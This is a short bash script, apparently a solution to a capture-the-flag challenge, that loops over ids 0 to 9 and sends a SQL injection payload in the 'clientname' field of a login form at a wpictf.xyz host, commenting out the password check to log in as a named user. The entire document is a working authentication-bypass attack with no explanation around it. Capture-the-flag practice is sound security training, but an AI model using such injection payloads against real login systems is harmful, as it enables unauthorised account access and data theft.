#!/bin/bash
for id in {0..9}; do
    echo "$id"
    curl --data-urlencode "clientname=Goutham' AND id = '$id' -- " \
        --data-urlencode "password=a" "https://vault.wpictf.xyz/login"
done
